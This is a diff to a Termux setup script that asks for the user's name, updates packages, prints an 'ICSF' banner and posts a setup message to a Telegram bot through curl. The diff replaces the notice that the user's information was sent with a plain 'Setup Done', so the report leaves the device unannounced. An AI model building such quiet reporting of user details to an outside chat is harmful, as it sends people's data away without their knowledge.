@@ -1,11 +1,11 @@
-
 #!/data/data/com.termux/files/usr/bin/bash
 
 # Ask user for their name or ID
-echo "🔷 অনুগ্রহ করে আপনার নাম বা আইডি লিখুন:"
+echo "🔷 Your Name.?"
 read USER_NAME
 
 # Update and upgrade packages
+apt update && apt upgrade -y
 pkg update -y
 pkg upgrade -y
 
@@ -34,21 +34,11 @@ MESSAGE="✅ একজন নতুন ইউজার সেটআপ সম্
 
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="$MESSAGE"
 
-echo "✅ সব কিছু সফলভাবে ইনস্টল হয়েছে। আপনার তথ্য পাঠানো হয়েছে।"
+echo "✅ Setup Done"
 
-echo 'IIIIIIIIII      CCCCCCCCCCCCC   SSSSSSSSSSSSSSS FFFFFFFFFFFFFFFFFFFFFF     
-     I::::::::I   CCC::::::::::::C SS:::::::::::::::SF::::::::::::::::::::F     
-     I::::::::I CC:::::::::::::::CS:::::SSSSSS::::::SF::::::::::::::::::::F     
-     II::::::IIC:::::CCCCCCCC::::CS:::::S     SSSSSSSFF::::::FFFFFFFFF::::F     
-       I::::I C:::::C       CCCCCCS:::::S              F:::::F       FFFFFF     
-       I::::IC:::::C              S:::::S              F:::::F                  
-       I::::IC:::::C               S::::SSSS           F::::::FFFFFFFFFF        
-       I::::IC:::::C                SS::::::SSSSS      F:::::::::::::::F        
-       I::::IC:::::C                  SSS::::::::SS    F:::::::::::::::F        
-       I::::IC:::::C                     SSSSSS::::S   F::::::FFFFFFFFFF        
-       I::::IC:::::C                          S:::::S  F:::::F                  
-       I::::I C:::::C       CCCCCC            S:::::S  F:::::F                  
-     II::::::IIC:::::CCCCCCCC::::CSSSSSSS     S:::::SFF:::::::FF                
-     I::::::::I CC:::::::::::::::CS::::::SSSSSS:::::SF::::::::FF                
-     I::::::::I   CCC::::::::::::CS:::::::::::::::SS F::::::::FF                
-     IIIIIIIIII      CCCCCCCCCCCCC SSSSSSSSSSSSSSS   FFFFFFFFFFF
+echo "██╗ ██████╗███████╗███████╗
+██║██╔════╝██╔════╝██╔════╝
+██║██║     ███████╗█████╗  
+██║██║     ╚════██║██╔══╝  
+██║╚██████╗███████║██║     
+╚═╝ ╚═════╝╚══════╝╚═╝"
